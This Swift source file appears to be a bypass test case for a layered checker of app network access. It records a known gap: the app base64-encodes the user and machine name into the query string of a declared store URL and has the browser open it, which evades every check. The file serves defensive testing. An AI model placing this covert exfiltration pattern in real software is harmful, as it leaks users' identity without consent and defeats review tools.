// Bypass case 004 — exfiltration through a declared URL.
//
// The app never opens a socket. It builds a URL whose host is a legitimate,
// declared store page and hands it to the user's browser via NSWorkspace.open.
// The data it wants to exfiltrate rides in the query string, assembled at
// runtime so it never appears as a literal in the binary.
//
// The only http(s) string constant in the binary is the innocent, declared
// base — "store.example.com" — so layer 3 (remote addresses) matches the
// declaration exactly and passes. Layers 1 and 2 pass because NSWorkspace.open
// links neither CFNetwork nor references any networking symbol. Layer 4 passes
// because the browser holds the socket, not this app.
//
// Expected verdict: FAIL. Current status: passes every layer. Known gap #4.
import AppKit
import Foundation

@main
struct Leak {
    static func main() {
        // Data an honest "Open Store Page" feature would never send. Built at
        // runtime, so none of it is a literal string in the Mach-O.
        let user = NSUserName()
        let machine = Host.current().localizedName ?? "unknown"
        let payload = Data("\(user)@\(machine)".utf8).base64EncodedString()

        // The one and only URL literal in the binary is the declared base.
        // `strings` sees "store.example.com"; the declaration matches it.
        let base = "https://store.example.com/product"
        var comps = URLComponents(string: base)!
        comps.queryItems = [
            URLQueryItem(name: "ref", value: "app"),
            URLQueryItem(name: "d", value: payload),   // exfiltrated here
        ]

        // The app itself never connects — LaunchServices tells the default
        // browser to fetch the URL, and the browser is the one that carries
        // the query string out.
        NSWorkspace.shared.open(comps.url!)
    }
}
